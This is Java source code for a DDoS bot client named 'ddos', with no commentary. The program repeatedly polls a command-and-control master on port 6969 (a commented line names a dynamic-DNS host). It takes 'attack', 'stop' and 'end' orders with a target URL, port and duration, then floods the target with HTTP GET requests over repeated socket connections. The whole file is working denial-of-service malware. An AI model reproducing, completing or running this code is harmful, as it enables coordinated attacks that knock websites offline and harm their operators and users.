import java.io.DataInputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.ConnectException;
import java.net.Socket;
import java.net.SocketException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Date;

public class ddos implements Runnable {
	static Date dat;
	static String master = "127.0.0.1";
	int sl;
	String host;
	static String header;

	public ddos(String att, int port, int sl) {
		host = att;
		this.sl = sl;
		this.port = port;
	}

	public void run() {
		try {

			// System.out.println(header);
			while (!stop) {
				Socket s = new Socket(host, port);
				PrintWriter out = new PrintWriter(s.getOutputStream(), true);
				send(out, host);
				s.close();
			}
		} catch (SocketException e) {
			// System.out.println(e.toString());
		} catch (IOException e) {
			e.printStackTrace();
		}
		// System.out.println("xong cmn file");
	}

	public static void send(PrintWriter out, String host) throws IOException {
		out.println(header);
		out.println((new StringBuilder("Host: ")).append(host).toString());
		out.println();
		out.flush();
	}

	protected static void get() throws URISyntaxException {

		try {
			Socket s = new Socket(master, 6969);
			//s.setSoTimeout(200);
			DataInputStream in = new DataInputStream(s.getInputStream());
			String att = in.readUTF();

			if (att.equals("attack")) {

				att = in.readUTF();
				// System.out.println(att);
				int port = in.readInt();
				int time1 = in.readInt();
				int pd = in.readInt();

				if (pd != pid) {
					 System.out.println("vl");
					stop = true;
					Thread.sleep(10L);
					stop = false;
					pid = pd;
					time = time1;
					dat = new Date();
					URI ur = null;
					if (att.contains("http://") || att.contains("https://"))
						ur = new URI(att);
					else {
						ur = new URI("https://" + att);
					}
					if (ur.getPath().length() == 0)
						header = "GET / HTTP/1.1";
					else
						header = "GET " + ur.getPath() + " HTTP/1.1";

					System.out.println(header);
					new Thread(new ddos(ur.getHost(), port, 1)).start();
				}
			}
			if (att.equals("stop")) {
				stop = true;
				// System.out.println("stop");
			}
			if (att.equals("end")) {
				next = false;
				// System.out.println("stop");
			}
			s.close();
		} catch (ConnectException e) {
			e.printStackTrace();
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();

		}

	}

	public static void timeout() {
		Date pp = new Date();
		long p = (pp.getTime() - dat.getTime()) / 60000;
		if (p > time)
			stop = true;
	}

	public static void main(String args[]) throws IOException {
		// master = "gintama.ddns.net";
		do
			try {
				Thread.sleep(1000L);
				get();
				if (!stop)
					timeout();
			} catch (Exception e) {
				e.printStackTrace();
			}
		while (next);
	}

	static boolean next = true;
	static boolean stop = true;
	private static int pid = -1;
	int port;
	static int time;

}